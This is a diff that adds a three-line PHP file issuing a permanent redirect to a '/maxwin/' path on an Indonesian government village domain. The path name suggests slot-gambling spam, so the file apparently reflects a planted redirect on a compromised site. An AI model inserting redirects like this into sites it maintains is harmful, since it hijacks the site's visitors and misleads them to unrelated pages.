@@ -1,0 +1,3 @@
+<?php
+
+header('Location: https://banyurejo.slemankab.go.id/maxwin/', true, 301);
